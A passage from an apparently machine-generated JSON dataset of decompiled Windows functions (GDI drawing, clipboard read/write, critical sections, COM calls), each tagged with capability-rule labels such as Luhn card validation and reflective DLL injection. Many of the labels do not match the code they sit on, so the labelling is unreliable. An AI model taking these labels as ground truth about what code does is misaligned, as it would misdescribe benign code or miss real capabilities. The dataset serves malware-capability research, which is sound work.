        "decompiled_code": "\nvoid __fastcall fcn.004289ac(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x4289e2;\n        var_4h = param_2;\n        iVar1 = fcn.00426260();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x4289ef;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x4289fb;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x428a08;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x428a5b;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.004289ac::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x428a62);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 468
    },
    "0042942c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042942c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x42944a;\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x42951f;\n            fcn.00419e5c();\n            return;\n        }\n    }\n    uStack104 = 0x42945a;\n    fcn.00429bf8();\n    uStack104 = 0x49aa18;\n    puStack108 = 0x429464;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack112 = 0x4294ee;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.00403af4();\n        in_stack_ffffff80 = 0;\n        fcn.00429e68(0, 0, &fcn.0042942c::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.004288e0();\n        fcn.004288e4();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection(0x49aa18, 0x4294f5);\n    return;\n}\n",
        "token_count": 502
    },
    "00429528": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429528(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint var_5ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puVar2 = &fcn.00429528::var_5ch;\n    for (iVar1 = 0x15; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    puStack112 = 0x42954d;\n    fcn.00429bf8();\n    var_4h = 0;\n    var_8h = 0;\n    uStack116 = 0x4295b8;\n    uStack120 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff88;\n    puStack112 = &stack0xfffffffc;\n    iVar1 = in_ECX;\n    if (in_ECX != *0x49a9fc) {\n        puStack112 = &stack0xfffffffc;\n        iVar1 = fcn.00429118();\n    }\n    var_8h = iVar1;\n    var_4h = fcn.00428ab4(*(in_EAX + 0x2c), &fcn.00429528::var_5ch);\n    uVar3 = 0;\n    fcn.00429e68(0, *(*(in_EAX + 0x28) + 0x70), &fcn.00429528::var_5ch);\n    *in_FS_OFFSET = uVar3;\n    return;\n}\n",
        "token_count": 428
    },
    "004295e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004295e8(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    fcn.004298dc();\n    iVar1 = *(in_EAX + 0x28);\n    *(iVar1 + 0x50) = 0;\n    *(iVar1 + 0x54) = 0;\n    fcn.0040f94c();\n    return;\n}\n",
        "token_count": 92
    },
    "00429618": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.00429618(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    uint *arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    arg_8h = fcn.00404620();\n    (**(*in_EAX + 0x58))();\n    uVar4 = (***arg_8h)();\n    fcn.0041b7b4(uVar4, uVar4 >> 0x20);\n    puVar3 = in_EAX[10] + 0x18;\n    puVar1 = &stack0xffffff98;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    fcn.00429bf8();\n    fcn.0040f94c();\n    fcn.00429e68(arg_8h, *(in_EAX[10] + 0x70), &stack0xffffff98);\n    return;\n}\n",
        "token_count": 264
    },
    "00429acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00429acc(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    fcn.004295e8();\n    iVar1 = *(in_EAX + 0x28);\n    if ((param_2 < 0) || (*(iVar1 + 0x20) <= param_2)) {\n        fcn.00425974();\n    }\n    fcn.00429b84();\n    sub.gdi32.dll_GdiFlush();\n    if (0 < *(iVar1 + 0x38)) {\n        param_2 = (*(iVar1 + 0x38) - param_2) + -1;\n    }\n    iVar2 = fcn.00425c54();\n    return iVar2 * param_2 & 0xffffffff00000000U | iVar2 * param_2 + *(iVar1 + 0x2c);\n}\n",
        "token_count": 213
    },
    "0042a500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042a500(int32_t param_1)\n\n{\n    int16_t aiStack112 [7];\n    uchar auStack98 [86];\n    \n    fcn.00429bf8();\n    if (param_1 == 0) {\n        fcn.00403af4();\n        fcn.00429e68(0, 0, auStack98);\n    }\n    else {\n        fcn.0041b95c();\n        if (aiStack112[0] != 0x4d42) {\n            fcn.004259a4();\n        }\n        fcn.00429f90(aiStack112);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0042ad28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ad28(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.00429c08();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.0042ad28::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x42ad75;\n    uVar1 = fcn.00428ab4(*(in_EAX + 0x2c), &fcn.0042ad28::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x42ada2;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.00429118();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 405
    },
    "0042ae74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ae74(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00426c60();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.004288e0();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 191
    },
    "0042b11c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042b11c(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x42b135;\n    piVar1 = fcn.00404620();\n    uStack36 = 0x42b1aa;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.0041b730(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.0041b95c();\n    fcn.0041b95c();\n    if (1 < var_ah._2_2_) {\n        fcn.004259b0();\n    }\n    fcn.0042b1d4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42b1ca;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 306
    },
    "0042b248": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b248(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint *puStack60;\n    uint lpvObject;\n    uint var_2ch;\n    uint piconinfo;\n    uint var_ch;\n    uint hgdiobj;\n    int32_t *var_4h;\n    \n    puStack60 = 0x42b260;\n    var_4h = in_EAX;\n    fcn.0042b1d4();\n    if (param_2 != 0) {\n        puStack60 = &fcn.0042b248::piconinfo;\n        puStack68 = 0x42b26e;\n        iStack64 = param_2;\n        iVar1 = sub.user32.dll_GetIconInfo();\n        if (iVar1 != 0) {\n            uStack72 = 0x42b2c5;\n            uStack76 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffb4;\n            uVar2 = hgdiobj;\n            puStack68 = &stack0xfffffffc;\n            iVar1 = sub.gdi32.dll_GetObjectA(hgdiobj, 0x18, &fcn.0042b248::lpvObject);\n            if (iVar1 != 0) {\n                iVar1 = var_4h[10];\n                *(iVar1 + 0x10) = var_2ch;\n                *(iVar1 + 0x14) = var_2ch;\n            }\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_DeleteObject(var_ch, 0x42b2cc);\n            sub.gdi32.dll_DeleteObject(hgdiobj);\n            return;\n        }\n    }\n    puStack68 = 0x42b2d7;\n    (**(*var_4h + 0x10))();\n    return;\n}\n",
        "token_count": 460
    },
    "0042b3e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.0042b3e4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x42b3f2;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x49aa10;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 223
    },
    "0042b604": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042b604(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 132
    },
    "0042b668": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b668(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "0042b674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b674(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "0042b834": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042b834(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(in_EAX + 4);\n    if (puVar1 == NULL) {\n        return;\n    }\n    uStack28 = 0x42b852;\n    fcn.0042b668();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 4) = *puVar1;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42b888;\n    uStack32 = 0x42b880;\n    fcn.0042b674();\n    return;\n}\n",
        "token_count": 205
    },
    "0042bb54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042bb54(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    \n    fcn.00405584();\n    puVar1 = fcn.0040a520();\n    while( true ) {\n        iVar2 = fcn.0040580c();\n        if ((iVar2 < 1) || ((0x20 < *puVar1 && (*puVar1 != 0x2e)))) break;\n        fcn.004059dc();\n        fcn.00405c6c();\n        puVar1 = fcn.0040a520();\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0042bc78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bc78(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack40 = 0x42bc8c;\n        fcn.00404974();\n    }\n    uStack44 = 0x42bcea;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0042bb54();\n    fcn.0042bba4(arg_8h, arg_14h);\n    fcn.00405584();\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h;\n    uStack48 = 0x42bcf1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 232
    },
    "0042bdf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042bdf0(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_8h;\n    uint rclsid;\n    \n    puStack48 = &stack0xfffffffc;\n    puStack60 = &stack0xfffffffc;\n    uStack52 = 0x42bed0;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    uStack64 = 0x42be4b;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    uVar1 = fcn.0040700c();\n    uVar2 = 0x42bee0;\n    sub.ole32.dll_CoCreateInstance(in_EAX, 0, 5, 0x42bee0, uVar1);\n    fcn.0042bd2c();\n    *in_FS_OFFSET = in_EAX;\n    *in_FS_OFFSET = uVar2;\n    uStack68 = 0x42bed7;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 304
    },
    "0042c0c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042c0c8(void)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_18h;\n    uint rclsid;\n    uint var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    puStack72 = &stack0xfffffffc;\n    uStack64 = 0x42c19d;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack68;\n    uStack76 = 0x42c12b;\n    iStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack80;\n    fcn.0042bd68();\n    uVar1 = fcn.0040700c();\n    iVar3 = 0x42c1ac;\n    puVar2 = &rclsid;\n    sub.ole32.dll_CoCreateInstance(puVar2, 0, 5, 0x42c1ac, uVar1);\n    fcn.0042bd2c();\n    *in_FS_OFFSET = puVar2;\n    *in_FS_OFFSET = iVar3;\n    iStack80 = 0x42c1a4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 328
    },
    "0042c718": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042c718(int32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    fcn.0040dbfc(0, &var_8h);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 104
    },
    "0042cd6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042cd6c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "0042d41c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d41c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42d4bc;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar2 = fcn.0042d2fc();\n    *(iVar2 + 8) = *(in_EAX + 0x18);\n    fcn.0041975c();\n    (**(*param_2 + 0x24))();\n    fcn.0040700c();\n    cVar1 = fcn.0040f95c();\n    if (cVar1 != '\\0') {\n        fcn.0041975c();\n    }\n    *(in_EAX + 0x18) = *(in_EAX + 0x18) + 1;\n    fcn.00407050();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42d4c3;\n    uStack32 = 0x42d4bb;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 317
    },
    "0042d2fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d2fc(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    fcn.00407024();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 137
    },
    "0042d340": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d340(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x14) = uVar1;\n    fcn.00405530();\n    *(in_EAX + 0x18) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 217
    },
    "0042ede8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ede8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 140
    },
    "00430f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430f64(uint param_1, code *param_2)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack52 = &stack0xfffffffc;\n    puStack40 = 0x430f7f;\n    fcn.00447b80();\n    puStack40 = 0x430f89;\n    fcn.0043b8bc();\n    puStack40 = 0x430f91;\n    fcn.0043b718();\n    uStack44 = 0x43100d;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    uStack56 = 0x430fd4;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *0x493330 = in_EAX;\n    puStack40 = &stack0xfffffffc;\n    (*param_2)();\n    *in_FS_OFFSET = param_1;\n    return;\n}\n",
        "token_count": 296
    },
    "004310ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004310ec(void)\n\n{\n    uint uVar1;\n    \n    *0x49abb8 = sub.user32.dll_RegisterWindowMessageA(0x431150);\n    *0x49abbc = sub.user32.dll_RegisterWindowMessageA(0x431160);\n    uVar1 = 1;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    uVar1 = fcn.0040af20(uVar1);\n    *0x493334 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    return;\n}\n",
        "token_count": 120
    },
    "0043143c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write clipboard data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043143c(uint dwBytes)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t in_EDX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint hMem;\n    uint var_4h;\n    \n    puStack28 = 0x431457;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x43150e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = dwBytes;\n    uStack44 = 0x2002;\n    puStack48 = 0x431470;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = sub.kernel32.dll_GlobalAlloc();\n    uStack52 = 0x4314e0;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x43148a;\n    uStack60 = uVar1;\n    puStack48 = &stack0xfffffffc;\n    sub.kernel32.dll_GlobalLock();\n    uStack68 = 0x4314cf;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.004030fc();\n    fcn.00431378();\n    uVar2 = in_EDX & 0xffff;\n    sub.user32.dll_SetClipboardData(uVar2, uVar1);\n    *in_FS_OFFSET = uVar2;\n    uStack72 = 0x4314d6;\n    sub.kernel32.dll_GlobalUnlock(uVar1);\n    return;\n}\n",
        "token_count": 466
    },
    "004315cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.004315cc(void)\n\n{\n    char cVar1;\n    uint16_t uVar2;\n    int32_t *in_EAX;\n    uint arg_8h;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4315e3;\n    (**(*in_EAX + 0x18))();\n    uStack32 = 0x431674;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack40 = 0;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = sub.user32.dll_EnumClipboardFormats();\n    while( true ) {\n        if (uVar2 == 0) {\n            fcn.0040dbc0();\n            fcn.00404ec4();\n            *in_FS_OFFSET = uStack40;\n            uStack32 = 0x43167b;\n            uStack36 = 0x431673;\n            (**(*in_EAX + 0x14))();\n            return;\n        }\n        cVar1 = fcn.004274ac();\n        if (cVar1 != '\\0') break;\n        uStack40 = uVar2;\n        uVar2 = sub.user32.dll_EnumClipboardFormats();\n    }\n    sub.user32.dll_GetClipboardData(uVar2);\n    arg_8h = sub.user32.dll_GetClipboardData(9);\n    fcn.004273bc(arg_8h);\n    fcn.00404f70();\n    return;\n}\n",
        "token_count": 374
    },
    "0043190c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
